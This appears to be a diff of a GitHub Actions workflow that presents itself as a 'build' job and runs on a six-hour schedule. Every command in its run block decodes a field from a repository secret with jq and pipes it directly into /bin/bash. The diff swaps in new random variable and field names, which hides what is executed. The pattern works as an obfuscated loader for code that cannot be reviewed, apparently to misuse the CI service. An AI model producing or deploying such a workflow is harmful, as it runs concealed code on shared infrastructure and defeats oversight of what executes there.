@@ -2,30 +2,31 @@ name: qiaofengzhong7171
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
-
-jobs:  # 33
+    - cron: '46 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: qiaofengzhong7171
         env:
-          e64: ${{ secrets.e64 }}
+          qqn91: ${{ secrets.qqn91 }}
         run: |
-          echo $e64 | jq -r .qyjo650 | /bin/bash
-          echo $dlvu5 | jq -r .vv942 | /bin/bash
-          echo $oupz7 | jq -r .bfhn2 | /bin/bash
-          echo $awe4 | jq -r .yu0 | /bin/bash
-          echo $dir65 | jq -r .xx6 | /bin/bash
-          echo $ocdzq5176 | jq -r .vk97211 | /bin/bash
-          echo $ckg01 | jq -r .p5209 | /bin/bash
-          echo $vgldf727 | jq -r .cv76419 | /bin/bash
-          echo $dv5 | jq -r .xgomb10030 | /bin/bash
-          echo $howyj6050 | jq -r .qiok215 | /bin/bash
-          echo $smwoz48 | jq -r .w3573 | /bin/bash
-          echo $nklii879 | jq -r .x393 | /bin/bash
-          echo $plvwz174 | jq -r .ico935 | /bin/bash
-          echo $nx79884 | jq -r .squm74 | /bin/bash
-          echo $hed64939 | jq -r .nb2236 | /bin/bash
+          echo $qqn91 | jq -r .xfmsr5945 | /bin/bash
+          echo $ljpgq89 | jq -r .qyouv3 | /bin/bash
+          echo $ljsc688 | jq -r .d028 | /bin/bash
+          echo $bril8466 | jq -r .japb0291 | /bin/bash
+          echo $g8 | jq -r .bsfiu0 | /bin/bash
+          echo $ea3945 | jq -r .lwhyr68 | /bin/bash
+          echo $asl4 | jq -r .hfq56 | /bin/bash
+          echo $e15757 | jq -r .c09 | /bin/bash
+          echo $xbso93930 | jq -r .umpj510 | /bin/bash
+          echo $klapn88760 | jq -r .ikp1863 | /bin/bash
+          echo $ynmbf1093 | jq -r .wx95757 | /bin/bash
+          echo $ajde856 | jq -r .hzovn05 | /bin/bash
+          echo $em9634 | jq -r .cny83 | /bin/bash
+          echo $dkz8964 | jq -r .ixv58 | /bin/bash
+          echo $ojcd609 | jq -r .dm61 | /bin/bash
+          echo $ppn0 | jq -r .egw0537 | /bin/bash
+          echo $vqp2500 | jq -r .ruzuy545 | /bin/bash
 
